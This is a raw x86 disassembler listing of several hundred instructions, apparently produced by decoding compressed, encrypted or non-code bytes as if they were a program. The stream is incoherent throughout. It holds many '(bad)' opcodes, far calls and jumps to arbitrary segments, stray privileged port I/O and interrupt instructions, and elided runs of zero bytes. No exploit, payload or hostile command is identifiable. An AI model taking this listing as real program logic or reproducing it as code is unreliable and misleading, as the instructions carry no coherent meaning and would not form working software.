  42c8c1:	dec    ebp
  42c8c2:	pop    ecx
  42c8c3:	ret    
  42c8c4:	fstp   DWORD PTR [esi+0x7a]
  42c8c7:	iret   
  42c8c8:	aas    
  42c8c9:	adc    ah,BYTE PTR [edi-0x19c6a6e4]
  42c8cf:	fmul   QWORD PTR [ecx-0x66]
  42c8d2:	aad    0xf2
  42c8d4:	push   cs
  42c8d5:	lahf   
  42c8d6:	jg     0x42c8fe
  42c8d8:	xchg   esp,eax
  42c8d9:	pusha  
  42c8da:	cmp    DWORD PTR [ecx+eax*1],edi
  42c8dd:	js     0x42c8de
  42c8df:	mov    ds:0x49123ab1,eax
  42c8e4:	cmp    dh,BYTE PTR [eax-0xb569233]
  42c8ea:	mov    bl,BYTE PTR [eax+ebx*4]
  42c8ed:	adc    ch,ah
  42c8ef:	fnsave [edx+0x50]
  42c8f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c8f3:	stos   DWORD PTR es:[edi],eax
  42c8f4:	es mov ecx,0xf39c8e46
  42c8fa:	jae    0x42c8e3
  42c8fc:	les    eax,FWORD PTR [ebp+0x17]
  42c8ff:	rcl    dx,0xd5
  42c903:	retf   0x8124
  42c906:	mov    bl,0xdf
  42c908:	push   edi
  42c909:	cld    
  42c90a:	xchg   ebp,eax
  42c90b:	or     DWORD PTR ds:0x234dcc6b,ebp
	...
  42c971:	add    BYTE PTR [eax],al
  42c973:	add    BYTE PTR [eax],dl
  42c975:	sbb    ecx,ecx
  42c977:	jmp    0xfb73c547
  42c97c:	(bad)  
  42c97d:	scas   eax,DWORD PTR es:[edi]
  42c97e:	inc    edi
  42c97f:	call   0x7ff1f703
  42c984:	(bad)  
  42c985:	fld    QWORD PTR [ecx]
  42c987:	add    BYTE PTR ds:0x4000001,al
  42c98d:	lods   eax,DWORD PTR ds:[esi]
  42c98e:	call   0xea16:0x40cf237d
  42c995:	jmp    0x13f2:0xabaf1e7b
  42c99c:	lods   eax,DWORD PTR ds:[esi]
  42c99d:	or     edx,edi
  42c99f:	push   ss
  42c9a0:	push   ds
  42c9a1:	add    eax,0x15ba3006
  42c9a6:	rcpps  xmm4,XMMWORD PTR [edi+ebx*4-0x104e7e86]
  42c9ae:	cdq    
  42c9af:	pop    ecx
  42c9b0:	xchg   esi,eax
  42c9b1:	dec    ebx
  42c9b2:	xchg   esp,eax
  42c9b3:	lock imul ebx,DWORD PTR [eax+ebx*2],0xffffff88
  42c9b8:	ret    
  42c9b9:	int3   
  42c9ba:	into   
  42c9bb:	dec    esp
  42c9bc:	enter  0x29b9,0x83
  42c9c0:	ins    BYTE PTR es:[edi],dx
  42c9c1:	jns    0x42c9c4
  42c9c3:	shl    BYTE PTR [ecx],0x8c
  42c9c6:	pop    ss
  42c9c7:	push   ebp
  42c9c8:	jns    0x42ca1d
  42c9ca:	cmp    eax,0xc5e9e710
  42c9cf:	add    al,0x8a
  42c9d1:	es (bad) 
  42c9d3:	push   ebp
  42c9d4:	xchg   esp,eax
  42c9d5:	cld    
  42c9d6:	jo     0x42ca06
  42c9d8:	in     eax,0x93
  42c9da:	and    eax,0xe6052089
  42c9df:	into   
  42c9e0:	popa   
  42c9e1:	or     BYTE PTR [ebx-0x24],0x24
  42c9e5:	mov    ds:0x658a5d31,al
  42c9ea:	xor    DWORD PTR [esp+ebx*2+0x3f91395c],eax
  42c9f1:	(bad)  
  42c9f2:	ins    DWORD PTR es:[edi],dx
  42c9f3:	sbb    bh,BYTE PTR [eax+ebx*8+0x8]
  42c9f7:	inc    ebp
  42c9f8:	adc    DWORD PTR [esi+0x5087bcde],0xc4e5cd1d
  42ca02:	add    al,0x8
  42ca04:	cmp    ah,BYTE PTR [ebp+0x5d8d314f]
  42ca0a:	shl    esp,0xf0
  42ca0d:	inc    esi
  42ca0e:	sub    DWORD PTR [edx+ebx*8],eax
  42ca11:	mov    ecx,0xae31f2cb
  42ca16:	dec    ebx
  42ca17:	dec    ebx
  42ca18:	jb     0x42ca65
  42ca1a:	and    ah,BYTE PTR [edi+0x46]
  42ca1d:	adc    ecx,DWORD PTR [ebp+0x55]
  42ca20:	aad    0x32
  42ca22:	jl     0x42c9ec
  42ca24:	adc    bl,BYTE PTR [edx+0x7a]
  42ca27:	xor    BYTE PTR [edi+ecx*4-0x763e2147],0xbd
  42ca2f:	idiv   BYTE PTR [eax]
  42ca31:	stos   BYTE PTR es:[edi],al
  42ca32:	nop
  42ca33:	in     al,dx
  42ca34:	test   DWORD PTR [ebp+0x3deaa588],ebx
  42ca3a:	das    
  42ca3b:	dec    edx
  42ca3c:	dec    ecx
  42ca3d:	xlat   BYTE PTR ds:[ebx]
  42ca3e:	pop    ds
  42ca3f:	xchg   edx,eax
  42ca40:	jo     0x42c9ec
  42ca42:	dec    esi
  42ca43:	sbb    dh,dl
  42ca45:	stos   DWORD PTR es:[edi],eax
  42ca46:	push   es
  42ca47:	outs   dx,BYTE PTR ds:[esi]
  42ca48:	jp     0x42ca80
  42ca4a:	sbb    al,0x68
  42ca4c:	mov    bh,0x41
  42ca4e:	and    al,0x79
  42ca50:	call   0xb1c6:0xd3bad7b7
  42ca57:	leave  
  42ca58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ca59:	daa    
  42ca5a:	or     eax,0x3a0a6e76
  42ca5f:	jno    0x42caa9
  42ca61:	cli    
  42ca62:	jb     0x42ca4b
  42ca64:	or     al,0x77
  42ca66:	cmp    dh,BYTE PTR [ebp+0x4d05e736]
  42ca6c:	or     cl,dh
  42ca6e:	loopne 0x42c9f2
  42ca70:	dec    edi
  42ca71:	or     eax,0xa84ebf10
  42ca76:	leave  
  42ca77:	pop    esi
  42ca78:	imul   ebx,DWORD PTR [edi-0x48],0xffffffa0
  42ca7c:	sbb    al,0x81
  42ca7e:	(bad)
  42ca81:	jnp    0x42ca30
  42ca83:	and    ecx,DWORD PTR [edx+ecx*4+0x44]
  42ca87:	sti    
  42ca88:	push   0x13051ac4
  42ca8d:	mov    ss,WORD PTR [ebx+0x18]
  42ca90:	pop    es
	...
  42caf1:	add    BYTE PTR [eax],al
  42caf3:	add    BYTE PTR [edi-0x2be7726],ah
  42caf9:	push   ebx
  42cafa:	out    dx,eax
  42cafb:	(bad)  
  42cafc:	fadd   QWORD PTR [ebp+0x27666ec0]
  42cb02:	je     0x42ca9b
  42cb04:	add    al,0xdf
  42cb06:	add    DWORD PTR [eax],eax
  42cb08:	add    eax,0xa000001
  42cb0d:	add    esi,DWORD PTR [edi]
  42cb0f:	std    
  42cb10:	fwait
  42cb11:	es iret 
  42cb13:	arpl   WORD PTR [eax],bp
  42cb15:	lock push eax
  42cb17:	jecxz  0x42cb83
  42cb19:	ins    DWORD PTR es:[edi],dx
  42cb1a:	ins    BYTE PTR es:[edi],dx
  42cb1b:	inc    ebp
  42cb1c:	addr16 inc ebx
  42cb1e:	ret    
  42cb1f:	sar    BYTE PTR ds:0xa00e86e4,cl
  42cb25:	das    
  42cb26:	sub    eax,0xf1507c06
  42cb2b:	adc    esp,DWORD PTR [esi+edx*4-0x7e]
  42cb2f:	xlat   BYTE PTR ds:[ebx]
  42cb30:	xor    DWORD PTR [ebx],eax
  42cb32:	fcomi  st,st(0)
  42cb34:	jp     0x42cb0e
  42cb36:	clc    
  42cb37:	mov    dl,0xae
  42cb39:	xchg   ebp,eax
  42cb3a:	leave  
  42cb3b:	adc    BYTE PTR [esi],ch
  42cb3d:	nop
  42cb3e:	cmp    al,0xcb
  42cb40:	jge    0x42cb6a
  42cb42:	dec    ebp
  42cb43:	fucom  st(7)
  42cb45:	pushf  
  42cb46:	pop    esp
  42cb47:	aas    
  42cb48:	and    ebx,DWORD PTR [ecx-0x5449f671]
  42cb4e:	test   edx,eax
  42cb50:	sbb    ecx,DWORD PTR [edx+edi*4-0x45]
  42cb54:	cmp    eax,0x86a5477c
  42cb59:	in     al,dx
  42cb5a:	cmp    BYTE PTR [ecx+edi*8-0x31b7a8ec],0xb8
  42cb62:	push   esp
  42cb63:	gs daa 
  42cb65:	mov    bh,0x83
  42cb67:	ror    dh,cl
  42cb69:	scas   eax,DWORD PTR es:[edi]
  42cb6a:	xchg   ebx,eax
  42cb6b:	outs   dx,BYTE PTR ds:[esi]
  42cb6c:	cmp    dh,bl
  42cb6e:	add    esp,edi
  42cb70:	sti    
  42cb71:	(bad)  
  42cb72:	push   DWORD PTR [edx]
  42cb74:	ror    BYTE PTR [edi],cl
  42cb76:	lock push ebp
  42cb78:	lods   eax,DWORD PTR ds:[esi]
  42cb79:	inc    esp
  42cb7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cb7b:	test   ah,bl
  42cb7d:	hlt    
  42cb7e:	scas   eax,DWORD PTR es:[edi]
  42cb7f:	pop    ecx
  42cb80:	inc    edi
  42cb81:	lods   eax,DWORD PTR ds:[esi]
  42cb82:	stos   DWORD PTR es:[edi],eax
  42cb83:	cs lahf 
  42cb85:	aaa    
  42cb86:	xchg   edx,eax
  42cb87:	lea    ecx,[esi]
  42cb89:	hlt    
  42cb8a:	scas   al,BYTE PTR es:[edi]
  42cb8b:	btc    DWORD PTR [ebp+ebp*8+0x7f],edi
  42cb90:	loope  0x42cbed
  42cb92:	jo     0x42cb5d
  42cb94:	repz retf 0xee9f
  42cb98:	ret    
  42cb99:	mov    BYTE PTR [eax],bl
  42cb9b:	gs jmp 0xb56c:0x98cd784f
  42cba3:	scas   al,BYTE PTR es:[edi]
  42cba4:	ja     0x42cbd0
  42cba6:	pop    ebx
  42cba7:	adc    al,0x6e
  42cba9:	xor    BYTE PTR [ebx+0x3b68d741],ah
  42cbaf:	push   ss
  42cbb0:	sbb    al,0xdd
  42cbb2:	out    0x11,eax
  42cbb4:	test   BYTE PTR [ebp+0x38],dl
  42cbb7:	mov    BYTE PTR [ebx+esi*4],dh
  42cbba:	cmp    BYTE PTR [edi],dh
  42cbbc:	cmp    BYTE PTR [edi],dh
  42cbbe:	mov    edi,0xf8734c77
  42cbc3:	mov    bl,0x42
  42cbc5:	retf   0x475c
  42cbc8:	js     0x42cb9f
  42cbca:	sbb    eax,0xe9623efc
  42cbcf:	das    
  42cbd0:	test   eax,0xff0f9d45
  42cbd5:	into   
  42cbd6:	mov    eax,0x4184a088
  42cbdb:	scas   al,BYTE PTR es:[edi]
  42cbdc:	push   es
  42cbdd:	lods   al,BYTE PTR ds:[esi]
  42cbde:	mov    eax,0xf79f0641
  42cbe3:	jns    0x42cb7c
  42cbe5:	xchg   cl,bl
  42cbe7:	sub    al,0xbc
  42cbe9:	fpatan 
  42cbeb:	jb     0x42cbf3
  42cbed:	jp     0x42cb9c
  42cbef:	jg     0x42cb86
  42cbf1:	fdivr  QWORD PTR [ebp+0x488959f3]
  42cbf7:	add    BYTE PTR [ecx-0x7c],dl
  42cbfa:	leave  
  42cbfb:	or     esi,DWORD PTR [edx+0x40cbffeb]
  42cc01:	leave  
  42cc02:	daa    
  42cc03:	push   es
  42cc04:	pop    es
  42cc05:	jb     0x42cc55
  42cc07:	mov    ch,0xca
  42cc09:	inc    edx
  42cc0a:	fstp   TBYTE PTR [ecx-0x6e943099]
  42cc10:	xchg   esp,eax
	...
  42cc71:	add    BYTE PTR [eax],al
  42cc73:	add    BYTE PTR [edi+0x2],bh
  42cc76:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42cc7a:	call   FWORD PTR [ebx]
  42cc7c:	fisttp WORD PTR [ebp+0x1]
  42cc7f:	or     eax,0x7b77ce4d
  42cc84:	or     eax,esp
  42cc86:	add    DWORD PTR [eax],eax
  42cc88:	add    eax,0xd6000001
  42cc8d:	xor    DWORD PTR [eax-0x29],esp
  42cc90:	arpl   WORD PTR [esi+edi*4-0x42f7001b],bp
  42cc97:	cdq    
  42cc98:	sub    DWORD PTR [edx],edi
  42cc9a:	and    bl,bh
  42cc9c:	push   edx
  42cc9d:	mov    edi,0xe82044a5
  42cca2:	or     al,0xb8
  42cca4:	adc    ecx,esi
  42cca6:	jo     0x42cce6
  42cca8:	sub    edx,DWORD PTR [edx]
  42ccaa:	cmp    edx,DWORD PTR [edi-0x658cf5e2]
  42ccb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ccb1:	out    dx,eax
  42ccb2:	xor    eax,0xb3a500a5
  42ccb7:	add    cl,BYTE PTR ds:0x3676b1ef
  42ccbd:	aam    0x99
  42ccbf:	add    bh,BYTE PTR [ecx]
  42ccc1:	les    edx,FWORD PTR [ecx]
  42ccc3:	retf   
  42ccc4:	addr16 mov cl,dh
  42ccc7:	test   bl,bl
  42ccc9:	in     eax,dx
  42ccca:	aaa    
  42cccb:	loopne 0x42ccac
  42cccd:	xor    DWORD PTR [ebx],ebx
  42cccf:	push   0xffffff90
  42ccd1:	nop
  42ccd2:	jg     0x42ccc4
  42ccd4:	les    ebp,FWORD PTR [edx]
  42ccd6:	jb     0x42cc83
  42ccd8:	and    bh,bl
  42ccda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ccdb:	xchg   ecx,eax
  42ccdc:	nop
  42ccdd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ccde:	les    esi,FWORD PTR [esi+0x19b28a3d]
  42cce4:	or     al,0xa1
  42cce6:	jmp    0x42ccdb
  42cce8:	div    BYTE PTR [ecx]
  42ccea:	push   esi
  42cceb:	jae    0x42cd4e
  42cced:	push   eax
  42ccee:	jecxz  0x42cca0
  42ccf0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ccf1:	loop   0x42cd22
  42ccf3:	fs stos DWORD PTR es:[edi],eax
  42ccf5:	pop    esi
  42ccf6:	fnstsw WORD PTR [ebx-0x15872dfc]
  42ccfc:	rcr    BYTE PTR [ecx+0x8f7edf1],cl
  42cd02:	adc    edx,eax
  42cd04:	adc    ch,ch
  42cd06:	inc    ebx
  42cd07:	mov    ebx,DWORD PTR [ebx]
  42cd09:	aad    0x22
  42cd0b:	rol    DWORD PTR [edi-0x2f6e9da0],cl
  42cd11:	ret    0x9bbd
  42cd14:	int    0x31
  42cd16:	add    BYTE PTR [ecx-0x3c],dl
  42cd19:	push   ecx
  42cd1a:	mov    eax,0x59e7b5af
  42cd1f:	lea    esi,ds:0x1d05104d
  42cd25:	call   FWORD PTR [ecx-0x5997c189]
  42cd2b:	icebp  
  42cd2c:	or     esp,DWORD PTR [edi]
  42cd2e:	inc    esp
  42cd2f:	iret   
  42cd30:	push   ebp
  42cd31:	mov    bh,0xa8
  42cd33:	test   BYTE PTR [ebx],ah
  42cd35:	mov    edx,0xd94b9f79
  42cd3a:	pop    ds
  42cd3b:	popa   
  42cd3c:	mov    eax,0x17163473
  42cd41:	inc    edi
  42cd42:	jnp    0x42cd52
  42cd44:	scas   al,BYTE PTR es:[edi]
  42cd45:	dec    ecx
  42cd46:	pop    edx
  42cd47:	scas   eax,DWORD PTR es:[edi]
  42cd48:	in     eax,0xf4
  42cd4a:	addr16 jb 0x42cd0f
  42cd4d:	push   esp
  42cd4e:	dec    edi
  42cd4f:	inc    esi
  42cd50:	and    DWORD PTR fs:[ecx-0x44],ebp
  42cd54:	(bad)  
  42cd56:	and    DWORD PTR [eax+0x17],0xffffffd6
  42cd5a:	and    BYTE PTR [eax+0x71d6069f],dh
  42cd60:	int3   
  42cd61:	mov    ebp,0x6721d966
  42cd66:	scas   eax,DWORD PTR es:[edi]
  42cd67:	cmp    DWORD PTR [ebp+0x2f],ebp
  42cd6a:	xchg   esi,eax
  42cd6b:	jecxz  0x42cd56
  42cd6d:	xchg   esp,eax
  42cd6e:	test   BYTE PTR [esi],0xdc
  42cd71:	mov    ebx,0xe440cc90
  42cd76:	mov    ebx,0x499f322e
  42cd7b:	inc    eax
  42cd7c:	dec    edx
  42cd7d:	loope  0x42cd92
  42cd7f:	adc    DWORD PTR [ebp-0x19],ebp
  42cd82:	mov    edx,0x40793310
  42cd87:	mov    ebp,0xd484fe14
  42cd8c:	cmp    esi,ebp
  42cd8e:	clc    
  42cd8f:	xor    ah,BYTE PTR [edx+0x0]
	...
  42cdf2:	add    BYTE PTR [eax],al
  42cdf4:	sbb    DWORD PTR [ecx-0x20017802],esp
  42cdfa:	jns    0x42cdbb
  42cdfc:	xchg   BYTE PTR [esi],dh
  42cdfe:	xchg   esi,eax
  42cdff:	mov    ch,0xe2
  42ce01:	ins    DWORD PTR es:[edi],dx
  42ce02:	xor    DWORD PTR [edi+0xe],edi
  42ce05:	loope  0x42ce08
  42ce07:	add    BYTE PTR ds:0x4f000001,al
  42ce0d:	jmp    0xb4d8:0x4c4426fe
  42ce14:	push   esp
  42ce15:	sti    
  42ce16:	and    DWORD PTR [edx+ebx*8],ebp
  42ce19:	jge    0x42ce65
  42ce1b:	aam    0xe6
  42ce1d:	popf   
  42ce1e:	adc    DWORD PTR [edx+0x15],esi
  42ce21:	mov    WORD PTR [eax-0x69],cs
  42ce24:	mov    BYTE PTR [edx+eax*1+0x7b4d8f63],ah
  42ce2b:	mov    ecx,0xe337002
  42ce30:	add    ch,ch
  42ce32:	mov    edi,esp
  42ce34:	nop
  42ce35:	sbb    al,0xc
  42ce37:	or     BYTE PTR [edi+0x12],dl
  42ce3a:	cmp    edx,DWORD PTR [ebp+ebx*8+0x7b1ee018]
  42ce41:	aaa    
  42ce42:	(bad)  
  42ce43:	xchg   edx,eax
  42ce44:	mov    edx,DWORD PTR [ecx+0x53]
  42ce47:	mov    eax,ds:0x830ac2ae
  42ce4c:	gs pop ecx
  42ce4e:	jmp    0xe438d07e
  42ce53:	retf   
  42ce54:	xchg   esp,eax
  42ce55:	leave  
  42ce56:	push   ecx
  42ce57:	in     al,dx
  42ce58:	add    dh,BYTE PTR ds:0xc27cfea7
  42ce5e:	cli    
  42ce5f:	jle    0x42ceac
  42ce61:	shl    BYTE PTR [ebx],1
  42ce63:	shl    BYTE PTR [esi],cl
  42ce65:	inc    ecx
  42ce66:	(bad)  
  42ce68:	ficom  DWORD PTR [edi-0x4a821235]
  42ce6e:	inc    eax
  42ce6f:	jecxz  0x42ce6a
  42ce71:	(bad)  
  42ce72:	(bad)  
  42ce73:	daa    
  42ce74:	cli    
  42ce75:	lods   al,BYTE PTR ds:[esi]
  42ce76:	adc    BYTE PTR [ecx-0x3f],cl
  42ce79:	shl    bh,1
  42ce7b:	dec    esp
  42ce7c:	das    
  42ce7d:	(bad)  
  42ce7e:	xor    dl,BYTE PTR [ecx-0x54]
  42ce81:	xor    eax,0x55e9d395
  42ce86:	in     eax,0x92
  42ce88:	or     dl,BYTE PTR [edx-0x27]
  42ce8b:	sub    eax,DWORD PTR ds:[ebx+eax*4+0x34637bf8]
  42ce93:	cmp    al,0xb4
  42ce95:	out    0xa2,eax
  42ce97:	popf   
  42ce98:	int    0x9a
  42ce9a:	ins    BYTE PTR es:[edi],dx
  42ce9b:	xchg   ecx,eax
  42ce9c:	shr    edx,cl
  42ce9e:	or     dl,bl
  42cea0:	int3   
  42cea1:	popf   
  42cea2:	mov    ds:0xb826168b,eax
  42cea7:	mov    bl,0xe9
  42cea9:	fwait
  42ceaa:	sbb    BYTE PTR [ebx-0x4f],bh
  42cead:	inc    ebp
  42ceae:	fdiv   st(6),st
  42ceb0:	in     al,dx
  42ceb1:	pop    edx
  42ceb2:	ja     0x42ceae
  42ceb4:	shr    BYTE PTR [edi-0x21],0xe0
  42ceb8:	mov    ah,0xbf
  42cebb:	in     eax,dx
  42cebc:	pusha  
  42cebd:	(bad)  
  42cebe:	in     al,dx
  42cebf:	sub    BYTE PTR [ecx-0xc8cdfaf],bh
  42cec5:	(bad)  
  42cec6:	lock jecxz 0x42ce8e
  42cec9:	stos   BYTE PTR es:[edi],al
  42ceca:	gs dec eax
  42cecc:	nop
  42cecd:	jb     0x42cf1f
  42cecf:	jecxz  0x42ce54
  42ced1:	push   es
  42ced2:	dec    ebp
  42ced3:	mov    es,WORD PTR [edx-0xe]
  42ced6:	xchg   DWORD PTR [ebx],edi
  42ced8:	jge    0x42cefb
  42ceda:	retf   0x4850
  42cedd:	and    bl,BYTE PTR [edx-0x127291c0]
  42cee3:	pop    eax
  42cee4:	call   0x1463bae6
  42cee9:	sbb    DWORD PTR es:[eax+0x732da625],0xb5834425
  42cef4:	shl    DWORD PTR [eax],cl
  42cef6:	ret    
  42cef7:	test   eax,0xb9588ade
  42cefc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cefd:	ins    DWORD PTR es:[edi],dx
  42cefe:	in     al,0xd4
  42cf00:	inc    ecx
  42cf01:	add    bl,BYTE PTR [esi+0xc76c5d4]
  42cf07:	mov    esp,DWORD PTR [edx-0x75]
  42cf0a:	fisub  DWORD PTR [eax-0x6ec92fab]
  42cf10:	add    DWORD PTR [eax],0x0
	...
  42cf72:	add    BYTE PTR [eax],al
  42cf74:	jae    0x42cfb3
  42cf76:	fadd   st,st(1)
  42cf78:	fsubrp st(5),st
  42cf7a:	jnp    0x42cf3b
  42cf7c:	or     al,BYTE PTR [esi]
  42cf7e:	cld    
  42cf7f:	les    ebp,FWORD PTR [esi]
  42cf81:	dec    esp
  42cf82:	inc    ecx
  42cf83:	arpl   WORD PTR [ebx],dx
  42cf85:	loop   0x42cf88
  42cf87:	add    BYTE PTR ds:0x4a000001,al
  42cf8d:	xchg   DWORD PTR [edi-0x6e],eax
  42cf90:	jae    0x42cf5f
  42cf92:	inc    edx
  42cf93:	bound  edi,QWORD PTR [edi-0x1f]
  42cf96:	sbb    DWORD PTR [edx+edx*8],esi
  42cf99:	adc    al,0x84
  42cf9b:	mov    esp,0x4a58e851
  42cfa0:	mov    cl,0xed
  42cfa2:	dec    ecx
  42cfa3:	dec    BYTE PTR [edx+0x62fce82f]
  42cfa9:	sbb    al,0xb
  42cfab:	pop    ebp
  42cfac:	call   0x6c3b:0x9b2c2067
  42cfb3:	adc    eax,0x51161d12
  42cfb8:	xchg   ecx,eax
  42cfb9:	push   cs
  42cfba:	mov    eax,0xa023a4d8
  42cfbf:	andnps xmm6,xmm2
  42cfc2:	jno    0x42cfca
  42cfc4:	outs   dx,DWORD PTR ds:[esi]
  42cfc5:	arpl   WORD PTR [ebx],ax
  42cfc7:	outs   dx,BYTE PTR ds:[esi]
  42cfc8:	inc    ebx
  42cfc9:	and    ch,BYTE PTR [edi+0x7a]
  42cfcc:	mov    ds:0x385d4165,eax
  42cfd1:	jle    0x42cf6c
  42cfd3:	cmc    
  42cfd4:	cmc    
  42cfd5:	pushf  
  42cfd6:	mov    edi,0x2fce057c
  42cfdb:	mov    eax,0x48e686a1
  42cfe0:	pop    ebp
  42cfe1:	fcmovnbe st,st(4)
  42cfe3:	and    DWORD PTR [esi+0x1601f2b4],eax
  42cfe9:	push   ss
  42cfea:	mov    edx,0x9c3333b7
  42cfef:	test   al,0xbe
  42cff1:	fwait
  42cff2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cff3:	in     eax,0x6b
  42cff5:	add    al,0x33
  42cff7:	in     eax,0xe5
  42cff9:	inc    esi
  42cffa:	xor    ch,BYTE PTR [eax+0x1c7593a3]
  42d000:	nop
  42d001:	xchg   edi,eax
  42d002:	jge    0x42cfd3
  42d004:	mov    al,ds:0x24473426
  42d009:	enter  0xed1,0x64
  42d00d:	pop    edx
  42d00e:	pop    edx
  42d00f:	cmovp  ecx,edi
  42d012:	pop    ecx
  42d013:	cmp    eax,0xe47f2c25
  42d018:	sti    
  42d019:	mov    es,WORD PTR [edx-0x768f819c]
  42d01f:	call   0xc1af4673
  42d024:	lea    edi,[edx+0x1de135e]
  42d02a:	inc    ecx
  42d02b:	adc    eax,0x979029f0
  42d030:	(bad)  
  42d032:	cmp    BYTE PTR [edx-0x27],ch
  42d035:	push   esp
  42d036:	pushf  
  42d037:	lods   al,BYTE PTR ds:[esi]
  42d038:	lahf   
  42d039:	push   edx
  42d03a:	jno    0x42d069
  42d03c:	sar    eax,0x57
  42d03f:	jmp    0x42d09a
  42d041:	xchg   BYTE PTR es:[ebp-0x2e],dh
  42d045:	push   esi
  42d046:	sub    BYTE PTR [esi],ch
  42d048:	dec    esp
  42d049:	lahf   
  42d04a:	out    0x97,al
  42d04c:	xlat   BYTE PTR ds:[ebx]
  42d04d:	imul   ecx,DWORD PTR [esi+0x49],0x51
  42d051:	cli    
  42d052:	call   0x9669:0x79b195a9
  42d059:	test   BYTE PTR [ebx+ebx*4],ch
  42d05c:	jmp    0xae01:0xbd2cad54
  42d063:	dec    eax
  42d064:	mov    gs:0x6ecc6f67,al
  42d06a:	mov    ebp,fs
  42d06c:	ins    DWORD PTR es:[edi],dx
  42d06d:	pushf  
  42d06e:	pop    edi
  42d06f:	xor    al,0xe4
  42d071:	adc    al,0xbd
  42d073:	sbb    dl,BYTE PTR [ebx]
  42d075:	stos   DWORD PTR es:[edi],eax
  42d076:	fld    QWORD PTR [ecx]
  42d078:	jp     0x42d0a0
  42d07a:	add    ch,BYTE PTR [ebp+0x67]
  42d07d:	retf   0x9454
  42d080:	jg     0x42d050
  42d082:	and    edx,DWORD PTR [ecx]
  42d084:	add    DWORD PTR [eax],esp
  42d086:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d087:	cmp    DWORD PTR [edx],esp
  42d089:	fucomp st(1)
  42d08b:	aad    0xf3
  42d08d:	mov    ds:0x8f834,eax
	...
  42d0f2:	add    BYTE PTR [eax],al
  42d0f4:	push   eax
  42d0f5:	cmp    al,dh
  42d0f7:	sub    al,0xee
  42d0f9:	cld    
  42d0fa:	cli    
  42d0fb:	jle    0x42d090
  42d0fd:	dec    esp
  42d0fe:	nop
  42d0ff:	xor    dl,ch
  42d101:	mov    ds:0xe3186b4a,al
  42d106:	add    DWORD PTR [eax],eax
  42d108:	add    eax,0x2a000001
  42d10d:	aas    
  42d10e:	ds mov bh,0x2c
  42d111:	test   DWORD PTR [ebp-0x6ee45138],esp
  42d117:	mov    edi,0x7e9166f5
  42d11c:	lods   eax,DWORD PTR ds:[esi]
  42d11d:	adc    eax,0x8b4fd5b7
  42d122:	mov    WORD PTR [ecx],?
  42d124:	out    0x1c,eax
  42d126:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d127:	dec    ebx
  42d128:	or     al,0x91
  42d12a:	push   edi
  42d12b:	out    0xbf,al
  42d12d:	xor    edx,DWORD PTR [edi]
  42d12f:	mov    bh,0x47
  42d131:	jae    0x42d190
  42d133:	sub    ebp,DWORD PTR [ebx]
  42d135:	or     ch,BYTE PTR [edx-0x2ab30c05]
  42d13b:	imul   esi,eax,0xff551d8f
  42d141:	fwait
  42d142:	cmp    BYTE PTR [esi],bl
  42d144:	or     DWORD PTR [edi-0x16],ebp
  42d147:	and    DWORD PTR [ebp+0x78],0xffffffab
  42d14b:	mov    esp,0x27af5f5f
  42d150:	xor    al,0x95
  42d152:	sub    BYTE PTR [ebp-0x36e6e53c],bl
  42d158:	(bad)  
  42d159:	icebp  
  42d15a:	xchg   esi,eax
  42d15b:	dec    eax
  42d15c:	(bad)  
  42d15d:	cmp    al,0x5e
  42d15f:	rol    BYTE PTR [edx],cl
  42d161:	cwde   
  42d162:	ins    DWORD PTR es:[edi],dx
  42d163:	mov    ah,0x3c
  42d165:	sub    al,0xbf
  42d167:	jl     0x42d1d4
  42d169:	dec    edx
  42d16a:	xor    eax,0xa38fcc06
  42d16f:	pop    ds
  42d170:	xchg   BYTE PTR [edi+ebx*1],dh
  42d173:	push   edx
  42d174:	shr    BYTE PTR [edi-0x4cbb658c],1
  42d17a:	pop    ebp
  42d17b:	out    dx,eax
  42d17c:	test   BYTE PTR [ecx+ecx*1],ah
  42d17f:	push   edi
  42d180:	and    al,0x12
  42d182:	aad    0xe3
  42d184:	out    dx,eax
  42d185:	mov    al,ds:0x817f14e6
  42d18a:	fimul  DWORD PTR es:[eax]
  42d18d:	popa   
  42d18e:	stos   BYTE PTR es:[edi],al
  42d18f:	mov    ds:0x93edd645,al
  42d194:	rcr    DWORD PTR [ecx+ecx*2-0x3216cfb9],cl
  42d19b:	xchg   edi,eax
  42d19c:	pop    ebx
  42d19e:	rcr    DWORD PTR [ebp+0x6b094d49],1
  42d1a4:	mov    cl,BYTE PTR [esi+0x4372f13e]
  42d1aa:	in     eax,dx
  42d1ab:	xchg   DWORD PTR [ecx],eax
  42d1ad:	xor    eax,0x246d72c
  42d1b2:	popa   
  42d1b3:	and    eax,0xf66e1fc3
  42d1b8:	mov    dh,0x41
  42d1ba:	out    0xf5,al
  42d1bc:	push   ebx
  42d1bd:	ins    BYTE PTR es:[edi],dx
  42d1be:	nop
  42d1bf:	fimul  DWORD PTR [eax+0xc8de5e7]
  42d1c5:	inc    esi
  42d1c6:	jo     0x42d18b
  42d1c8:	inc    ebp
  42d1c9:	ret    
  42d1ca:	leave  
  42d1cb:	aam    0xe1
  42d1cd:	sahf   
  42d1ce:	or     edi,DWORD PTR [ecx]
  42d1d0:	push   eax
  42d1d1:	push   0x18
  42d1d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d1d4:	scas   al,BYTE PTR es:[edi]
  42d1d5:	or     al,0xc3
  42d1d7:	adc    cl,BYTE PTR [edi+0x16]
  42d1da:	jae    0x42d233
  42d1dc:	add    BYTE PTR [eax],bh
  42d1de:	daa    
  42d1df:	jecxz  0x42d209
  42d1e1:	inc    eax
  42d1e2:	jge    0x42d180
  42d1e4:	or     eax,DWORD PTR ds:0xa27b84e9
  42d1ea:	jg     0x42d23a
  42d1ec:	shl    BYTE PTR [edi],1
  42d1ee:	retf   
  42d1ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d1f0:	xchg   edx,eax
  42d1f1:	les    edi,FWORD PTR [ebx-0x16]
  42d1f4:	loope  0x42d231
